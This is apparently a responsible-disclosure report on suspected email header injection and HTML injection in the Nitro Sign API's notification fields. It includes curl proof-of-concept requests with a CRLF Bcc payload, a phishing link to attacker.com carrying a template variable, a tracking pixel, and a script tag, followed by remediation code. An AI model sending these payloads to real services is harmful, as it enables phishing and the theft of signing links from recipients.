# NIT-002: Sign API Notification — Potential Email Header Injection + HTML Injection via Unrestricted Body/Subject

**Program:** Nitro Responsible Disclosure  
**Contact:** security@gonitro.com  
**Asset:** `api.gonitro.dev` (Nitro Sign API), `cloud.gonitro.com`  
**Severity:** Medium (6.1) — pending email rendering confirmation  
**CVSS:** 6.1 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)  
**CWE:** CWE-20 — Improper Input Validation  
**CWE:** CWE-74 — Improper Neutralization of Special Elements  
**Discovered:** 2026-06-29  
**Status:** PoC ready — requires test API credentials to confirm

---

## Summary

The Nitro Sign API's `notification` object (used in `POST /sign/envelopes`) accepts free-text `body` and `subject` values with no `maxLength` and no documented sanitization constraints. Two attack surfaces are present:

1. **Email Header Injection**: The `subject` field has no length limit and accepts arbitrary characters. If CRLF (`\r\n`) sequences are not stripped server-side before constructing the SMTP message, an attacker can inject additional email headers (e.g., `BCC`, `CC`, `To`) to send signing notification spam or harvest addresses.

2. **HTML Content Injection in Email Body**: The `body` field has no length limit and the API documentation states it "supports dynamic variables" via `$(variable)` syntax. If Nitro sends signing notification emails as `text/html` (common for modern transactional email), an attacker can inject arbitrary HTML — including phishing links — into legitimate Nitro-branded signing request emails sent to third parties.

Both vectors abuse the fact that the attacker (a legitimate Nitro Sign API subscriber) controls the content of emails sent by Nitro's trusted email infrastructure to signing participants who did not request to receive emails from the attacker.

---

## Evidence

### OpenAPI Specification — No Input Validation on notification fields

Source: `https://api.gonitro.dev/openapi.json`

```json
{
  "Notification": {
    "type": "object",
    "properties": {
      "subject": {
        "type": "string",
        "description": "The subject line of the notification email.",
        "minLength": 1
        // ← NO maxLength, NO pattern validation, NO character blacklist
      },
      "body": {
        "type": "string",
        "description": "The body content of the notification email.",
        "minLength": 1
        // ← NO maxLength, NO pattern validation, NO HTML escaping documented
      }
    },
    "required": ["body", "subject"]
  }
}
```

The official API documentation states explicitly:
> "both fields support dynamic variables"
> Available variables: `envelope_name`, `sender_name_or_email`

### Attack Vector 1: Email Header Injection via `subject`

If the email is sent using naive string concatenation, a CRLF-injected subject line can add arbitrary headers to the SMTP envelope:

```json
POST /sign/envelopes
{
  "name": "Test Envelope",
  "notification": {
    "subject": "Please sign this document\r\nBcc: victim@example.com\r\nX-Custom: injected",
    "body": "Please review and sign."
  },
  ...
}
```

**Expected impact if unpatched:**
- The signing notification email is BCC'd to the attacker's address (or any target)
- The attacker receives a copy of every signing notification, including signing links/URLs
- Attackers can spam external email addresses through Nitro's mail servers (trusted sender reputation)

### Attack Vector 2: HTML Injection in Email Body

If Nitro's email template wraps the user-provided `body` in an HTML email layout without escaping:

```json
POST /sign/envelopes
{
  "name": "Contract",
  "notification": {
    "subject": "Please review and sign",
    "body": "Hi,\n\nYour document is ready to sign.\n\n<a href=\"https://attacker.com/steal?token=$(sender_name_or_email)\">Click here to sign securely</a>\n\nThank you"
  },
  ...
}
```

**Attack scenario:**
1. Attacker (legitimate Nitro Sign user) creates a signing envelope targeting `victim@company.com`
2. The envelope notification email arrives from legitimate Nitro mail servers (trusted, not spam)
3. The email displays in the victim's inbox as:
   - **From:** Nitro Sign `<noreply@gonitro.com>` (or similar)
   - **Subject:** "Please review and sign"
   - **Body (rendered HTML):** "Click here to sign securely" — hyperlinked to attacker's site
4. Victim clicks the "sign" link, lands on phishing page impersonating Nitro's signing portal
5. Attacker harvests victim's access code / session from phishing page

**Why this is higher severity than typical HTML injection:**
- Email originates from Nitro's trusted infrastructure
- Victim has a legitimate business relationship with the sender (attacker)
- The email context (document signing) creates urgency
- Victim has no way to verify the link without inspecting the raw HTML

### Attack Vector 3: Template Variable Injection via Envelope Name

The `$(envelope_name)` variable is evaluated from the envelope's `name` field. If the envelope name contains HTML and is expanded before escaping:

```json
{
  "name": "<script>alert(1)</script>Important Contract",
  "notification": {
    "subject": "Please sign $(envelope_name)",
    "body": "Please sign $(envelope_name)"
  }
}
```

If the expansion happens in the email template pre-sanitization, the rendered email could contain executable HTML/JavaScript (in email clients that render scripts, or webmail with relaxed CSP).

---

## Proof of Concept (for researcher to run with test account)

### PoC 1: CRLF Header Injection Test

```bash
# Requires valid API credentials (client_id + client_secret)
ACCESS_TOKEN=$(curl -s -X POST "https://api.gonitro.dev/oauth/token" \
  -H "Content-Type: application/json" \
  -d '{"clientID": "YOUR_CLIENT_ID", "clientSecret": "YOUR_CLIENT_SECRET"}' | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

curl -s -X POST "https://api.gonitro.dev/sign/envelopes" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "CRLF Test Envelope",
    "mode": "sequential",
    "notification": {
      "subject": "Please sign\r\nBcc: attacker@wearehackerone.com\r\nX-Injected: yes",
      "body": "Please sign this document."
    },
    "participants": [
      {
        "name": "Test Signer",
        "email": "YOUR_TEST_EMAIL",
        "type": "signer"
      }
    ]
  }'

# Check if attacker@wearehackerone.com receives a copy of the signing notification
# Check email headers for X-Injected header presence
```

### PoC 2: HTML Injection Test

```bash
curl -s -X POST "https://api.gonitro.dev/sign/envelopes" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "HTML Test",
    "mode": "sequential",
    "notification": {
      "subject": "Please sign",
      "body": "Normal text\n\n<a href=\"https://example.com/phishing\">Click here to sign securely</a>\n\n<img src=\"https://attacker.com/pixel.png\" width=\"1\" height=\"1\">"
    },
    "participants": [
      {
        "name": "Test Signer",
        "email": "YOUR_TEST_EMAIL",
        "type": "signer"
      }
    ]
  }'

# Check the received email:
# - Does "Click here to sign securely" render as a hyperlink?
# - Does the tracking pixel load? (confirms HTML rendering)
# - Is the body displayed as plain text or HTML?
```

---

## Impact

| Scenario | Impact | Severity |
|---------|--------|---------|
| CRLF header injection | Email spoofing, BCC spam via Nitro mail servers | Medium-High |
| HTML link injection | Phishing via legitimate Nitro emails | Medium-High |
| Tracking pixel in body | Recipient IP/read-time tracking, privacy violation | Medium |
| Template variable HTML injection via name | XSS-like content in email | Medium |

---

## Remediation

### 1. Strip CRLF from subject before SMTP transmission

```python
def sanitize_email_subject(subject: str) -> str:
    # Remove all CR, LF, and null bytes
    return re.sub(r'[\r\n\x00]', '', subject)
```

### 2. Treat body as plain text (or sanitize HTML)

If the notification body is intended to support plain text:
- Send email as `text/plain` only
- If HTML email is required, use an allowlist-based HTML sanitizer (e.g., DOMPurify, bleach)

### 3. Add maxLength constraints to OpenAPI spec

```json
"subject": {
  "type": "string",
  "minLength": 1,
  "maxLength": 200,
  "pattern": "^[^\\r\\n]*$"
}
```

### 4. Sanitize template variables before expansion

Escape HTML entities in `$(variable)` values before expanding into the template:
```
$(envelope_name) → htmlEscape(envelope_name)
```

---

## References

- CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')
- OWASP Email Injection: https://owasp.org/www-community/vulnerabilities/Email_Injection
- CWE-20: Improper Input Validation
- Nitro Sign API OpenAPI spec: `https://api.gonitro.dev/openapi.json`
- Affected endpoint: `POST https://api.gonitro.dev/sign/envelopes`
